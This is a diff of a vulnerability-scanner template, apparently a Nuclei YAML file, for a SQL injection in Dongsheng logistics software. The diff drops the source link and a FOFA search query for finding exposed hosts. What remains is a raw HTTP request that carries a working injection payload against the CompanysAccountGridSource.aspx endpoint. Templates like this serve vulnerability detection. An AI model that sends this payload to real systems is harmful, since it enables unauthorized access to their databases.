@@ -3,12 +3,8 @@ info:
   name: 东胜物流软件CompanysAccountGridSourceSQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ll7hvf44f3egq4yl'
+  description: ''
   tags: rce,sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ll7hvf44f3egq4yl
-    fofa: body="CompanysAdapter.aspx"
 http:
 - raw:
   - 'GET /Shipping/CompanysAccountGridSource.aspx?LINKID=-1%27%20and%201=user%20--&read=exist HTTP/1.1
